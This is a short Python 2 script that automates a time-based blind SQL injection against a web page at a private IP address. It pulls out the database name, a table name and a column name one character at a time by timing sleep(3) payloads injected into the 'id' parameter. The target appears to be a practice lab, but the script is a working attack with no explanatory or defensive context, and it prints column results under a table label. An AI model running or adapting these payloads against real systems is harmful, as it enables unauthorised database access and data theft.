import requests
import time as tm

daan=[]

for i in range(1,9):

      for a in range(97,123):
            t1 = tm.time()
            #172.28.100.10/wanzhong/reade/?id=9' and if(ascii(substr(database(),1,1))>64,sleep(3),1)%23
            url="http://172.28.100.10/wanzhong/reade/?id=9' and if(ascii(substr(database(),"+str(i)+",1))="+str(a)+",sleep(3),1)%23"
            r=requests.get(url,)
            ste="You are in."
            yy=r.text.find(ste)
            t2=tm.time()
            t=t2-t1
            if t>=3:
                  print "库"+chr(a)
                  daan.append(chr(a))
                  


wb=''.join(daan)
print "库名："+wb


anne=[]

for i in range(1,9):

      for a in range(97,123):
            t1 = tm.time()
            url="http://172.28.100.10/wanzhong/reade/?id=9%27%20and%20if(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%20%22"+wb+"%22%20limit%200,1),"+str(i)+",1))="+str(a)+",sleep(3),1)%23"
            r=requests.get(url,)
            ste="You are in."
            yy=r.text.find(ste)
            t2=tm.time()
            t=t2-t1
            if t>=3:
                  print "表"+chr(a)
                  anne.append(chr(a))
                  


wbs=''.join(anne)
print "表名："+wbs





anna=[]

for i in range(1,9):

      for a in range(48,123):
            t1 = tm.time()
            url="http://172.28.100.10/wanzhong/reade/?id=9%27%20and%20if(ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name=%27"+wbs+"%27%20limit%201,1),"+str(i)+",1))="+str(a)+",sleep(3),1)%23"
            r=requests.get(url,)
            ste="You are in."
            yy=r.text.find(ste)
            t2=tm.time()
            t=t2-t1
            if t>=3:
                  print "表"+chr(a)
                  anna.append(chr(a))
                  


wbn=''.join(anna)
print "表名："+wbn


















